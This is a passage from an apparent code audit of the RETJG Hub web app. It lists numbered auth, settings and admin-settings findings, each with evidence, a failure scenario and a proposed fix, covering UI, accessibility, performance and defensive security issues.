**Proposed fix.** In checkAuth, separate 'not authenticated' from 'couldn't ask'. Check `resp.ok` and parse inside the try. On a throw or a non-2xx, don't call showLoginPage. Instead set #splash-msg to 'Can't reach RETJG Hub. Check your connection.', remove .loading-dot, and append a Retry button that calls `checkAuth().then(...)` (or `location.reload()`). Also listen once for `window.addEventListener('online', () => location.reload(), {once:true})`. Only `data.authenticated === false` from a 200 should show the login page.

<a id="auth-settings-10"></a>
#### auth-settings-10 — Email OTP field is type=number without autocomplete=one-time-code: no code autofill, no Enter, no double-submit guard, paste with a space fails

*medium · minor · ui-ux · confidence high · `index.html:921` · unverified*

**Evidence.** `<input id="login-otp" type="number" inputmode="numeric" pattern="[0-9]*" placeholder="000000" maxlength="6"` (921). It has no autocomplete, maxlength and pattern are ignored on type=number, and the associate PIN beside it documents why type=text is right (936-941). The Verify button (924-927) has no id and is never disabled in submitOtp (33580-33608). The only Enter handler is for #login-email (33905-33907). sendLoginLink's success path (33566-33568) never focuses #login-otp, and a failed code is left in the box.

**Failure scenario.** On iOS 17+ and Android, the OS can offer the 6-digit code from Mail or Messages above the keyboard only for autocomplete="one-time-code". Here the manager must switch apps, memorise the code and type it back. On desktop, a mouse-wheel scroll over the focused field changes the code. Pasting '123 456' yields '' and 'Enter your 6-digit code.' Pressing Enter/Go does nothing. A double tap fires two verifies, so the second can flash 'Invalid or expired code' while the page reloads.

**Proposed fix.** Markup: `<input id="login-otp" type="text" inputmode="numeric" autocomplete="one-time-code" enterkeyhint="go" maxlength="6" ...>` and give the button `id="otp-btn"`. In submitOtp: `const otp = el('login-otp').value.replace(/\D/g,'')`; if the button is disabled, return; otherwise disable it and show 'Verifying…', re-enable in catch/else, and on a wrong code clear and focus the input. Extend the Enter listener to `login-otp` → submitOtp (and `assoc-pin` → associateLogin). After a successful send, call `el('login-otp').focus()`.

<a id="auth-settings-11"></a>
#### auth-settings-11 — Every login input is 14px, so iOS zooms the sign-in card on focus (and the PWA stays zoomed)

*medium · minor · ui-ux · confidence high · `index.html:906` · unverified*

**Evidence.** #login-email (906-907), #login-otp (921-922), #assoc-name (933-934), #assoc-pin (939-941) and #assoc-reset-name (958-959) all use `text-sm`; Chromium computes 14px for all five. #passkey-device-name (6389-6390) is text-sm too, and #print-range-select (5985-5986) is text-xs (12px). The viewport meta (line 5) doesn't prevent zoom, and no CSS rule raises inputs to 16px. The Menu page's search box was deliberately made 16px 'so iOS does not zoom' (tasks/todo.md Phone nav plan).

**Failure scenario.** On an iPhone, tapping the email field, the associate name or the code box zooms the page. In standalone PWA mode the zoom persists after sign-in until the user pinches out, so the dashboard opens magnified and cut off at the right.

**Proposed fix.** Replace `text-sm` with `text-base` (16px) on those six inputs and `text-xs` with `text-base` on #print-range-select (or `text-[16px] sm:text-sm` to keep desktop density). Nothing else changes.

<a id="auth-settings-12"></a>
#### auth-settings-12 — Sign-in dead ends: the email form has no Back, and 'Check your email' has no resend or 'use a different email'

*medium · minor · ui-ux · confidence high · `index.html:915` · unverified*

**Evidence.** #login-form-wrap (904-913) holds only the label, input, error and button, with no way back to the invite screen or associate login. #login-sent (915-929) has no resend and no change-email link. auth-login answers {ok:true} for unknown addresses by design (worker.js:15868-15884), so a typo always lands here. The pending email lives only in the DOM (#login-email). The document-level Enter handler (33905-33907) calls sendLoginLink even while the button is disabled ('Sending…'), which sends two emails with two different codes.

**Failure scenario.** An associate taps 'Already have an account? Sign in' by mistake and has no way back to Associate login except killing the app. A manager mistypes their address: 'Check your email' appears, nothing arrives, and the only recovery is reloading. A manager switches to Mail to read the code, iOS evicts the PWA, and on return the app is back at the invite screen with the email gone, so they must request (and wait for) another code.

**Proposed fix.** Markup plus about 15 lines. Add `<button onclick="showLoginPage()" class="text-xs ... min-h-[44px]">← Back</button>` under #login-btn. In #login-sent, add 'Didn't get it? Resend · Use a different email', calling `sendLoginLink()` and `showSignInForm(); el('login-sent').classList.add('hidden')`. On a successful send, save the email to sessionStorage ('login-pending-email', with a timestamp). In showLoginPage(), if an entry under 15 minutes old exists, restore #login-email and open #login-sent directly. At the top of sendLoginLink, add `if (el('login-btn').disabled) return;`.

<a id="auth-settings-13"></a>
#### auth-settings-13 — Push 'Enable' button is white on #3BB54A (2.66:1) in both themes and 28px tall

*medium · minor · accessibility · confidence high · `index.html:12082` · unverified*

**Evidence.** _setNotifToggleState: `: 'bg-[#3BB54A] hover:bg-[#32a040] text-white'` (12082). Chromium renders the button as color rgb(255,255,255) on rgb(59,181,74), 28px tall (py-1.5). Contrast computed from the hex values: white on #3BB54A = 2.66:1 (needs 4.5:1 for 12px semibold). Every other green button in the unit uses dark ink, e.g. #login-btn `bg-[#3BB54A] ... text-[#06210f]` = 6.41:1. The background is the same literal in dark mode, so it fails in both themes.

**Failure scenario.** Managers with low vision, or on a phone in sunlight, can't read the one control that turns push notifications on. The 28px height is also below the 44px tap-target guideline.

**Proposed fix.** Change the unsubscribed branch to `'bg-[#3BB54A] hover:bg-[#32a040] text-[#06210f]'` (6.41:1, matching the login and passkey buttons). Change the base classes to `px-3 py-2.5 min-h-[44px]` for both states. The Disable state (red-700 on red-100, 5.30:1; red-400 on red-900/30 over gray-800, 5.07:1) already passes.

<a id="auth-settings-14"></a>
#### auth-settings-14 — Landing pace uses its own thresholds (<30% red, else amber) and text-accent-amber, which is 2.15:1 in light mode

*medium · minor · accessibility · confidence high · `index.html:33145` · unverified*

**Evidence.** lpPaceColour: `if (pct >= 100) return 'text-accent-green'; return pct < 30 ? 'text-op-bad' : 'text-accent-amber';` and lpPaceBar the same (33145-33154). The comment says it mirrors the store cards, but the store cards and hero use `pct >= 80 ? warn : bad` (10107-10108, 10534-10537), and DESIGN.md §2.1 'Pacing semantics' says amber when 80 ≤ pct < 100, red otherwise. text-accent-amber has no light override: the file retints only text-accent-green, text-op-bad and text-op-warn (150, 186-188). In Chromium in light mode, lpPaceColour(55) renders rgb(245,158,11), which is 2.15:1 on the white panel and 1.93:1 on opl-bg (computed). The hero pace is text-3xl, where even the large-text minimum is 3:1.

**Failure scenario.** A superuser opens the picker at 2 pm with the chain at 55% of the day's budget. The landing hero shows a pale amber '55%' that is hard to read in light mode. Tapping into Bargain Lane then shows the same 55% in red on the dashboard hero, so the two screens disagree about whether that is bad.

**Proposed fix.** Use the app's rule and its AA-safe tokens: `function lpPaceColour(p){ if (p==null) return 'text-opl-inkDim dark:text-op-inkDim'; if (p>=100) return 'text-accent-green'; return p>=80 ? 'text-op-warn' : 'text-op-bad'; }` and `lpPaceBar` → `p>=100 ? 'bg-accent-green' : p>=80 ? 'bg-op-warn' : 'bg-op-bad'`. text-op-warn resolves to #92400e in light (7.09:1) and #f59e0b in dark (8.28:1 on op-panel). Fix the comment too.

<a id="auth-settings-15"></a>
#### auth-settings-15 — logout() has no error handling: offline, Sign out silently does nothing and the session stays

*medium · minor · bug · confidence high · `index.html:33689` · unverified*

**Evidence.** `async function logout() { await fetch(`${WORKER_BASE}?action=auth-logout`, { method: 'POST', credentials: 'include' }); currentUser = null; location.reload(); }` (33689-33693). A rejected fetch throws out of an onclick handler, so there is no reload and no message. The session cookie is HttpOnly (worker.js:14861), so only the worker can clear it. Nothing prevents a double tap. The Marketing composer draft in localStorage ('ct-composer-draft', 18070) also survives into the next user's session on a shared device.

**Failure scenario.** An associate on the warehouse phone taps Sign out where the wifi drops out. Nothing visibly happens, they put the phone down, and the next person works (and logs pallets 'by' them, 33546-33548) under their 12-hour session. On desktop the tap is simply ignored.

**Proposed fix.** Wrap the fetch in `try { const r = await fetch(...); if (!r.ok) throw new Error(); } catch (_) { await uiAlert("Couldn't sign out — you're offline. Connect and try again.", { title: 'Sign out' }); return; }`, guarded by a module-level `if (logout._busy) return; logout._busy = true` flag. Before reloading, `localStorage.removeItem('ct-composer-draft')` and `sessionStorage.removeItem(BIZ_KEY)`. Pair with the push unsubscribe in auth-settings-4.

<a id="auth-settings-16"></a>
#### auth-settings-16 — Error messages a store manager cannot act on: raw fetch/JSON/WebAuthn/Resend text, and a silently swallowed passkey failure

*medium · minor · ui-ux · confidence high · `index.html:33572` · unverified*

**Evidence.** sendLoginLink `const data = await resp.json(); ... catch (e) { el('login-error').textContent = e.message;` (33565-33574). associateLogin `el('assoc-error').textContent = e.message` (33659). registerPasskey and passkeyLogin show e.message (33759, 33828) and swallow NotAllowedError entirely (33758, 33827). togglePushSubscription shows `Error: ${e.message}` (12228) after `const { publicKey } = await pkResp.json(); ... urlB64ToUint8Array(publicKey)` (12205-12209). The worker sends 'Resend error: 429 …' (14968 → 15886), 'Credential not found' (16247) and 'Challenge expired or not found' (16238). Notification.permission is never checked.

**Failure scenario.** On iOS, a dropped connection shows 'Load failed', and a Cloudflare HTML error page shows 'The string did not match the expected pattern.' A manager whose Face Unlock passkey was removed in Settings taps the Face ID button and reads 'Credential not found'. Re-registering an already-enrolled phone shows the raw InvalidStateError sentence. Tapping Face ID on a device with no passkey closes the OS sheet and shows nothing. With notifications blocked in iOS Settings, Enable says 'Error: Registration failed - permission denied'. If VAPID isn't configured, it says 'Error: Cannot read properties of undefined (reading 'length')'. None of these tell the user what to do.

**Proposed fix.** Add one helper, `function authErr(e, ctx)`: map `TypeError`/'Load failed'/'Failed to fetch' to 'Couldn't reach RETJG Hub — check your connection and try again.'; SyntaxError or a non-2xx to 'Something went wrong on our side — try again in a minute.'; InvalidStateError on register to 'Face Unlock is already set up on this device.'; 'Credential not found' to 'This Face ID sign-in was removed. Sign in with email, then turn it on again in Settings.' (call `PublicKeyCredential.signalUnknownCredential?.({rpId:'retjghub.com', credentialId})` where supported); NotAllowedError on login to a soft hint, 'No Face ID sign-in here yet? Sign in with email first, then enable it in Settings.' Check `resp.ok` before `.json()` in each call site. In togglePushSubscription, check `Notification.permission === 'denied'` up front and say 'Notifications are blocked for RETJG Hub — allow them in your phone's Settings → Notifications.'

<a id="auth-settings-18"></a>
#### auth-settings-18 — Settings 'Print dashboard' row squeezes its text column to 18px wide at phone width

*medium · minor · ui-ux · confidence high · `index.html:5977` · unverified*

**Evidence.** `<div class="w-full flex items-center gap-4 px-5 py-4">` holds icon, `flex-1 min-w-0` text, the select and the Print button in one row (5977-5988). Measured in Chromium at 393px: the text column is 18px wide and 264px tall, and the select is 142px. In a screenshot, 'One-page report: totals, budget pace, vs last year and a per-store table.' breaks one word per line down a 264px-tall card. The 'App tips' row gets 101px.

**Failure scenario.** Every phone user who opens Settings sees the first card break down to a word-per-line column. It looks broken and pushes the rest of Settings down the screen.

**Proposed fix.** Let the controls wrap under the text on narrow screens. Change the row to `w-full flex flex-wrap items-center gap-x-4 gap-y-3 px-5 py-4` and wrap select+button in `<div class="flex items-center gap-2 w-full sm:w-auto sm:flex-shrink-0 pl-12 sm:pl-0">` with the select as `flex-1 sm:flex-none`. Give the App tips row the same treatment. Re-measure at 393px: text column ≥ 200px.

<a id="auth-settings-19"></a>
#### auth-settings-19 — Invite screen hides the main door: email sign-in is a 12px link 16px tall, below two large dark buttons

*medium · minor · ui-ux · confidence medium · `index.html:879` · unverified*

**Evidence.** `<button onclick="showSignInForm()" class="text-xs text-accent-green hover:underline focus:outline-none">Already have an account? Sign in →</button>` (879-882). Measured 214×16px in Chromium, with `focus:outline-none` and no replacement focus ring. Below it, 'Associate login' is a full-width dark button (887-889, 40px), and the passkey button another (896-899). Every manager, admin and executive signs in by email (the invite email itself tells them to tap 'Already have an account?', worker.js:15012), and nothing remembers which door a device used last.

**Failure scenario.** A manager whose session expired every 7 days (see auth-settings-5) gets the invite-only message first and has to find and hit a 16px-tall green text link. Keyboard users get no visible focus on it. On a shared phone, associates tap 'Associate login' every single time even though localStorage already holds 'assoc-name'.

**Proposed fix.** Markup plus 3 lines of JS. Make email sign-in a real full-width button, e.g. `<button onclick="showSignInForm()" class="w-full min-h-[44px] bg-[#3BB54A] hover:bg-[#32a040] text-[#06210f] font-semibold text-sm rounded-lg">Sign in with email</button>`, above 'Associate login'. Keep the invite-only sentence as secondary copy beneath. Drop `focus:outline-none`. In showLoginPage() with no error, if `localStorage.getItem('assoc-name')` is set, open showAssociateLogin() directly; the '← Back' already returns to the choice screen.

<a id="auth-settings-22"></a>
#### auth-settings-22 — auth-me only starts after about 1.5 MB of inline JS parses and DOMContentLoaded fires, putting its round trip on every launch's critical path

*medium · minor · performance · confidence medium · `index.html:34862` · unverified*

**Evidence.** The boot call `checkAuth().then(authed => {...` is inside `document.addEventListener("DOMContentLoaded", ...)` (34761, 34861-34862). The main <script> spans 7479-35317, about 1,548,397 bytes of inline JS (measured). auth-me itself does 3 sequential D1 reads (session join, grants, businessesFor; worker.js:14247-14269, 16102). loadAll() cannot start until auth-me resolves (34877), and the head script (836-857) already runs before first paint.

**Failure scenario.** On a mid-range Android phone, launching the PWA spends a few hundred ms parsing and compiling the inline script. Only then does auth-me go out, adding its full round trip plus D1 time before the login decision and before any data fetch. The splash 'Loading…' sits there for the sum of both, when they could overlap.

**Proposed fix.** In the existing <head> script (836-857) add `try { window.__authMe = fetch('https://api.retjghub.com/?action=auth-me', { credentials: 'include' }).then(r => r.json()); } catch (_) {}`. Use the same WORKER_BASE literal, or read it from a data attribute so staging still works. In checkAuth, `const data = await (window.__authMe || fetch(...).then(r => r.json()))` and clear `window.__authMe` after first use, so later calls fetch fresh. Keep the auth_error and offline handling from auth-settings-7/8. Measure with Chrome DevTools, throttled 4x CPU: splash-to-app time before and after.

<a id="auth-settings-9"></a>
#### auth-settings-9 — Magic-link GET burns both the link and the OTP (same row), so a mail scanner that pre-fetches links kills both sign-in methods

*medium · major · bug · confidence medium · `worker.js:15891` · unverified*

**Evidence.** auth-login stores the link token and the code in ONE row: `INSERT INTO magic_links (token, email, expires_at, otp_code)` (15879-15881). auth-verify is a plain GET that consumes that row on first touch: `UPDATE magic_links SET used_at = ? WHERE token = ?` (15904-15905), without checking request.method or user intent. auth-verify-otp then requires `used_at IS NULL` (15948). A GET by a link-scanning proxy (Microsoft Defender Safe Links, Mimecast, Proofpoint) or a mail client's link preview therefore consumes the row and invalidates the 6-digit code in the same email.

**Failure scenario.** A company mailbox with Safe Links: the scanner GETs the sign-in URL seconds after delivery. The user clicks the link and gets 'That link has expired or already been used.' They type the code from the same email and get 'Invalid or expired code.' Every request repeats this, so the user cannot sign in by email at all.

**Plan.** FUTURE PLAN (worker-only; no frontend or schema change). 1) Split the row: auth-login inserts two rows, a link row (token=linkToken, otp_code NULL) and a code row (token=randomHex(32), otp_code=code), with the same email and expiry. Using either one marks all of that email's unused rows used, so both still die together after a real sign-in. 2) Make GET auth-verify side-effect-free: return a tiny HTML page with a 'Continue to RETJG Hub' button that POSTs the token (or auto-submits via JS after a user-visible delay). Only the POST consumes the token and sets the cookie. 3) Keep accepting a GET of old links for 15 minutes after deploy by serving them the same interstitial. Deploy order: worker only. The frontend never calls auth-verify, and old emails keep working through the interstitial, so nothing breaks backward compatibility. Risks: scanners that execute JS may still POST (mitigate with a user-gesture-only button); the interstitial must set no cookie on GET. Verify on staging with a throwaway account: GET the link with curl (no cookie set), then the OTP from the same email still works, then clicking Continue signs in. Confirm the rollout per CLAUDE.md rule 5.

<a id="auth-settings-8"></a>
#### auth-settings-8 — auth_error in the URL skips auth-me: a user who double-clicked the sign-in link is signed in but sees 'That link has expired'

*low · minor · ui-ux · confidence high · `index.html:31690` · unverified*

**Evidence.** checkAuth: `const authError = params.get('auth_error'); if (authError) { history.replaceState({}, '', '/'); showLoginPage(authError === 'expired' ? 'That link has expired or already been used. Request a new one.' : 'Sign-in failed. Please try again.'); return; }` (31690-31697) returns before calling auth-me. On the worker, the first GET of auth-verify sets the session cookie, and the second GET of the same token redirects with `?auth_error=expired` (worker.js:15899-15901).

**Failure scenario.** A manager double-clicks 'Sign in' in desktop Outlook, or taps it twice. Two requests hit auth-verify: the first creates a valid session cookie, the second redirects to /?auth_error=expired. The tab in front shows the expired-link error and an email form, although they are signed in. They request another email and wait for it, when a reload would already have worked.

**Proposed fix.** Keep reading auth_error but don't return early: strip it with replaceState, run the normal auth-me call, and only if `!data.authenticated` call showLoginPage(errorMsg). Signed-in users go straight to the app. The expired message still appears for everyone else.

<a id="auth-settings-17"></a>
#### auth-settings-17 — Forgot-code confirms 'Your admin has been asked' even when the request never left the phone

*low · minor · bug · confidence high · `index.html:33676` · unverified*

**Evidence.** `try { await fetch(`${WORKER_BASE}?action=associate-reset-request`, ...); } catch (_) { /* the answer is the same either way — see below */ } done.textContent = 'Your admin has been asked to set you a new code.';` (33676-33686). The anti-enumeration reason in the comment applies to the worker's answer (always {ok:true}, worker.js:16053-16068), not to a client-side network failure, which reveals nothing about who exists.

**Failure scenario.** An associate on warehouse wifi that has dropped taps 'Ask for a new code'. The fetch rejects, but they are told the admin was asked. No pin_reset_requested_at is written, so no badge appears for the admin, and the associate waits for a code that never comes.

**Proposed fix.** In the catch, show `done.textContent = "Couldn't send — check your connection and try again."` (in the error colour), re-enable the button and return. Keep the single success message for every response the worker actually returned, which preserves the no-enumeration property.

<a id="auth-settings-20"></a>
#### auth-settings-20 — Passkey assertion never checks the UV flag or a sign-count regression

*low · minor · security · confidence medium · `worker.js:16255` · unverified*

**Evidence.** passkey-auth-begin asks for `userVerification: 'required'` (16218), but passkey-auth-finish checks only UP: `if (!(flags & 0x01)) throw new Error('User presence flag not set');` (16255-16256). WebAuthn §7.2 requires verifying the UV bit (0x04) when UV is required. The new signCount is stored blindly (`UPDATE webauthn_credentials SET sign_count=?`, 16269-16272) and never compared with `cred.sign_count`, so a cloned authenticator is never flagged.

**Failure scenario.** An authenticator or client that returns an assertion with user presence but without user verification is accepted as a full 7-day login, defeating the 'biometrics' promise. Platform authenticators normally set UV, so the practical exposure is limited, but the server doesn't enforce what it asked for.

**Proposed fix.** Worker-only, about 4 lines: after the UP check, `if (!(flags & 0x04)) throw new Error('User verification required')`. After verifying the signature, `if (signCount !== 0 && cred.sign_count && signCount <= cred.sign_count) throw new Error('Authenticator counter went backwards')`. Keep the 0 case, since synced passkeys always report 0. Deploy with wrangler and verify a real Face ID login on staging still succeeds.

<a id="auth-settings-21"></a>
#### auth-settings-21 — Accessibility back chevron is a forward navigation, so swipe-back loops Settings and Accessibility

*low · minor · ui-ux · confidence high · `index.html:6413` · unverified*

**Evidence.** `<button onclick="navigateToPage('settings')" aria-label="Back to settings"` (6413). navigateToPage pushes the outgoing page when `pushHistory && currentPage !== page` (11914-11916). The page comment says 'swipe-back works off navStack with no extra wiring' (6404-6409), and goBack is exposed as window.__navBack (35222).

**Failure scenario.** The user goes Dashboard → Settings → Accessibility, then taps the back chevron. The stack is now [dashboard, settings, accessibility]. Swiping back from Settings goes to Accessibility again instead of the Dashboard, and one more swipe goes back to Settings.

**Proposed fix.** `onclick="window.__navBack ? __navBack() : navigateToPage('settings')"`. The top of navStack is 'settings' (pushed when Accessibility was opened), so the chevron and the swipe gesture now agree.

<a id="auth-settings-23"></a>
#### auth-settings-23 — Login card cannot scroll in short viewports: top and bottom cut off in landscape, and with the keyboard open

*low · minor · ui-ux · confidence high · `index.html:868` · unverified*

**Evidence.** `<div id="login-page" class="hidden fixed inset-0 ... flex items-center justify-center">` (868) has no overflow-y-auto. Measured in Chromium with the associate form open: at 667×375 the card spans −32px to 408px (logo cut off, the '← Back / Forgot your code?' row below the fold) and the container's computed overflow-y is 'visible'. At 375×420 it spans −10px to 430px.

**Failure scenario.** On a phone in landscape, or on an iPhone SE with the keyboard up, the associate cannot reach 'Forgot your code?' or '← Back', and the fixed overlay won't scroll to reveal them.

**Proposed fix.** Change #login-page to `hidden fixed inset-0 bg-[#F6F6F6] dark:bg-gray-900 z-50 flex items-start sm:items-center justify-center overflow-y-auto py-[max(1rem,env(safe-area-inset-top))]`. Items-start plus overflow-y-auto lets the card scroll while short viewports still centre it with margin.

<a id="auth-settings-24"></a>
#### auth-settings-24 — Settings drifts from the design system: gray-800 panels in dark (Accessibility uses op-panel), disclosures have no aria-expanded, and the radios are about 20px targets

*low · minor · ui-ux · confidence medium · `index.html:5976` · unverified*

**Evidence.** Settings cards are `bg-white dark:bg-gray-800 ... border-gray-100 dark:border-gray-700` (5976, 5993, 6009, 6023, 6261, 6371), while its child page uses `bg-opl-panel dark:bg-op-panel border-[rgba(20,16,8,0.08)] dark:border-op-border` (6422), per DESIGN.md §2.1 (op-* tokens). In dark mode Settings is #1f2937 and Accessibility #101826. Dim text on gray-800 is op-inkDim at 4.74:1 (passes). The Change Log, Notifications and Face Unlock toggles (6024, 6262, 6372) set only a chevron rotation and never `aria-expanded`/`aria-controls`. The interval radios are bare `<label class="flex items-center gap-1.5">` rows, about 20px tall (6320-6334).

**Failure scenario.** Going Settings → Accessibility in dark mode, the panel colour jumps between parent and child. Screen-reader users hear 'button' with no expanded or collapsed state on three disclosures. Thumb-tapping 'Every 3 hours' next to 'Every hour' is error-prone.

**Proposed fix.** Swap the six Settings card classes to `bg-opl-panel dark:bg-op-panel border border-[rgba(20,16,8,0.08)] dark:border-op-border`. The OLED overrides then come from the variables instead of the gray layer. Add `aria-expanded="false" aria-controls="changelog-content"` (and the equivalents) to the three row buttons, and in toggleChangelog/toggleNotifSettings/togglePasskeySettings set `btn.setAttribute('aria-expanded', String(open))`. Give the radio labels `min-h-[44px] px-2`. Verify contrast in light, dark and OLED as in DESIGN.md.

<a id="auth-settings-25"></a>
#### auth-settings-25 — Landing shows '$0.00' and '● Live' before any data loads, instead of skeletons

*low · minor · ui-ux · confidence high · `index.html:33197` · unverified*

**Evidence.** The boot calls `navigateToPage(landing, false)`, which calls renderLanding() (11907-11910), before `loadAll()` resolves (34877-34882). With allStoreData and liveCloverData still empty, bargainLaneFigures returns total 0, so `setTxt('landing-hero-total', fmtDollar(gTotal))` prints '$0.00', the legend prints $0.00 three times, and `live.classList.toggle('hidden', reporting.length === 0)` shows '● Live'. DESIGN.md §6 prescribes `.skel` for the loading state.

**Failure scenario.** A superuser opening the picker sees 'Today · All businesses $0.00' with a Live pill for a second or more on mobile, then the real figure. Pre-open, $0.00 is also a real value, so the flash can't be told apart from 'nothing sold'.

**Proposed fix.** Track a `landingLoaded` flag set in the `Promise.resolve(loaded).finally` at 34880. While it is false, render `<span class="skel" style="width:9ch;height:1em"></span>` into landing-hero-total, the per-card net and the legend values, and hide #landing-hero-live. Render the numbers once data has arrived.

<a id="auth-settings-26"></a>
#### auth-settings-26 — Remembered associate name on a shared phone: focus jumps to the code, so the next associate's code counts toward the previous one's 10-strike lockout

*low · minor · ui-ux · confidence medium · `index.html:33623` · unverified*

**Evidence.** showAssociateLogin: `el('assoc-name').value = localStorage.getItem('assoc-name') || ''; ... el(el('assoc-name').value ? 'assoc-pin' : 'assoc-name').focus();` (33623-33624). The worker increments the NAMED account's counter on a wrong code: `UPDATE users SET pin_failures = pin_failures + 1 WHERE id = ?` (worker.js:16018-16019), and locks at PIN_MAX_FAILURES = 10 (14826, 16012-16016) until an admin resets it. The worker comments describe the phone as shared (16024-16026).

**Failure scenario.** Pat signed in on the warehouse phone yesterday. Sam opens Associate login; the keyboard is already on the code field with 'Pat Q' prefilled above it, so Sam types Sam's code and gets 'didn't match'. Each such slip is a strike on Pat. After ten across a week without Pat signing in, Pat is locked out and needs an admin.

**Proposed fix.** When a name is remembered, show it as a chip rather than a silent value: `Signing in as <b>Pat Q</b> · <button>Not you?</button>`. 'Not you?' clears the name, removes 'assoc-name' and focuses the name field. Keep focus on the code only while the chip is visible, so the name being used is always on screen.

<a id="auth-settings-27"></a>
#### auth-settings-27 — renderLanding puts business name, source and unit noun into innerHTML without escaping

*low · minor · security · confidence medium · `index.html:33267` · unverified*

**Evidence.** `...truncate text-opl-ink dark:text-op-ink${dimName}">${b.name}</div>` (33267), `Enter ${b.name} →` (33288, 33326), `title="Needs ${source} API credentials first"` (33283) and `lpTile(b.unitNoun + 's', ...)` (33322 → 33166 `${label}`). The values come from auth-me's businesses (worker.js:14378-14384), read from the D1 businesses table. Today that table is written only by migrations (grep: no UPDATE/INSERT INTO businesses in worker.js), and escapeHtml exists (7753).

**Failure scenario.** No path exists today. The first admin UI that lets someone rename a business (or a unit noun containing '&' or '<') would turn this into stored HTML injection on the superuser's landing page, or at minimum mis-render the text.

**Proposed fix.** Wrap each interpolation: `${escapeHtml(b.name)}`, `${escapeHtml(source)}`, `escapeHtml(b.unitNoun + 's')`. That is 5 edits, with no behaviour change for the current names.

</details>

<a id="admin-settings"></a>
### Admin Settings (Repair console, costs, overrides)

Admin Settings is the app's main destructive surface. Its newest part, the Repair console (health check, then a list of dates, backup, guarded repair, reversible restore), is careful and mostly follows the CLAUDE.md rules. The biggest risk is the older code around it. Five buttons (Backfill Last 13 Weeks, Re-snapshot Item Sales, Re-snapshot selected range, SRR month re-snapshot, ISR range re-snapshot) still push blind date ranges through the worker's `snapshot` and `items-snapshot` endpoints. Neither endpoint ever got the magnitude guard or the backup that `rebuildItemSnapshot` has, and three of those buttons don't even ask for confirmation. `saveCategoryOverrides` has two data bugs, both reproduced by running the real function in node: it wipes the whole override map when its read-before-write fails, and on a second save it deletes the wrong L3 rule. The Admin Tools labor-hours entry locks the whole store-day row, which is the same trap the Labor page already avoids. Smaller issues: Clover category names reach innerHTML unescaped in the L3 cost editor, several colours fail 4.5:1 (the 'Healthy' tile is 2.28:1 in light), and the page barely works on a phone (the L3 name column measured 10px at 393px, and 14px inputs zoom on iOS). Done well: category costs can't be saved before they load, repair-run takes a list rather than a range and aborts a date's write if its backup fails, restore backs up what it replaces, and most fetches check res.ok and escape Clover item names.

| ID | Sev | Size | Category | Finding | Where | Verified |
|---|---|---|---|---|---|---|
| [admin-settings-2](#admin-settings-2) | high | minor | bug | Four bulk re-pull buttons run with no confirmation and no in-flight guard | `index.html:15660` | unverified |
| [admin-settings-3](#admin-settings-3) | high | minor | bug | Saving category overrides wipes the entire override map when the read-before-write fails | `index.html:17144` | unverified |
| [admin-settings-4](#admin-settings-4) | high | minor | bug | L3 rule removal is by stale index, so a second save deletes a different rule | `index.html:17162` | unverified |
| [admin-settings-1](#admin-settings-1) | high | major | bug | items-snapshot and snapshot overwrite KV/D1 history with no magnitude guard and no backup | `worker.js:18987` | unverified |
| [admin-settings-5](#admin-settings-5) | high | major | bug | Manual Labor Hours locks the whole store-day row, so that day's sales and budget stop updating | `index.html:15863` | unverified |
| [admin-settings-7](#admin-settings-7) | medium | minor | bug | SRR/ISR re-snapshot prompts promise safety the endpoints do not provide | `index.html:16211` | unverified |
| [admin-settings-8](#admin-settings-8) | medium | minor | bug | A failed D1 read silently disables the magnitude guard, and the health check calls it 'All clear' | `worker.js:27033` | unverified |
| [admin-settings-9](#admin-settings-9) | medium | minor | bug | repair-run re-pulls whatever list it is given without re-checking that the date is still unhealthy | `worker.js:27054` | unverified |
| [admin-settings-10](#admin-settings-10) | medium | minor | bug | Repair backups: the index is written after the overwrites, and the backup copies never expire | `worker.js:27080` | unverified |
| [admin-settings-11](#admin-settings-11) | medium | minor | ui-ux | Restore confirmation names a count, not the store-dates it will overwrite | `index.html:16627` | unverified |
| [admin-settings-12](#admin-settings-12) | medium | minor | ui-ux | 'Repair N dates' always fails when the health check lists more than 60 | `index.html:16582` | unverified |
| [admin-settings-13](#admin-settings-13) | medium | minor | security | Clover category names and Item Master descriptions are rendered as HTML | `index.html:22812` | unverified |
| [admin-settings-14](#admin-settings-14) | medium | minor | bug | Item Master upload silently replaces every stored cost, and the per-item editor keeps showing the old list | `index.html:22551` | unverified |
| [admin-settings-15](#admin-settings-15) | medium | minor | bug | 'Rebuild Week Summaries' only reaches the current calendar year, so Jan–Mar skips the prior year's weeks | `worker.js:27324` | unverified |
| [admin-settings-17](#admin-settings-17) | medium | minor | bug | SRR hides a failed D1 read behind a green 'Loaded' and skips its post-write check | `index.html:16052` | unverified |
| [admin-settings-18](#admin-settings-18) | medium | minor | ui-ux | L3 Category Costs is unusable on a phone: the category name column is 10px wide | `index.html:22811` | unverified |
| [admin-settings-19](#admin-settings-19) | medium | minor | accessibility | Several text colours on this page fail 4.5:1 | `index.html:16459` | unverified |
| [admin-settings-20](#admin-settings-20) | medium | minor | ui-ux | Phone: every field zooms on iOS, dark-mode controls render light, and tap targets are 34–36px | `index.html:6516` | unverified |
| [admin-settings-22](#admin-settings-22) | medium | minor | bug | L3 Category Costs shows 'no sales' for every admin-mapped category | `worker.js:19830` | unverified |
| [admin-settings-6](#admin-settings-6) | medium | major | bug | Manual sales overrides and the daily-CSV import overwrite and permanently lock D1 totals with no backup, summary or undo | `index.html:15772` | unverified |
| [admin-settings-16](#admin-settings-16) | medium | major | bug | Choosing a template in the sticker editor makes it the label every store prints | `index.html:25627` | unverified |
| [admin-settings-21](#admin-settings-21) | low | minor | accessibility | Form controls are unlabeled and long-running status is never announced | `index.html:6507` | unverified |
| [admin-settings-23](#admin-settings-23) | low | minor | performance | Every visit to Admin Settings re-reads and parses 42 full item snapshots | `index.html:22914` | unverified |
| [admin-settings-24](#admin-settings-24) | low | minor | performance | noncategorized-items reads KV one key at a time and has no range cap | `worker.js:19433` | unverified |
| [admin-settings-25](#admin-settings-25) | low | minor | bug | Admin writes leave the 5-minute API cache stale, and invalidateApiCache is never called | `index.html:16878` | unverified |
| [admin-settings-26](#admin-settings-26) | low | minor | ui-ux | Destructive bulk tools look exactly like the safe read-only ones | `index.html:6661` | unverified |
| [admin-settings-27](#admin-settings-27) | low | minor | ui-ux | Announcement preview shows items the server drops, and the form can re-push a cleared announcement | `index.html:21403` | unverified |
| [admin-settings-28](#admin-settings-28) | low | minor | bug | ISR re-snapshot: the final refresh has no error handling and caches are not invalidated | `index.html:16812` | unverified |
| [admin-settings-29](#admin-settings-29) | low | minor | bug | A per-day Sales Report spanning two months is labelled and compared as one month | `index.html:15968` | unverified |

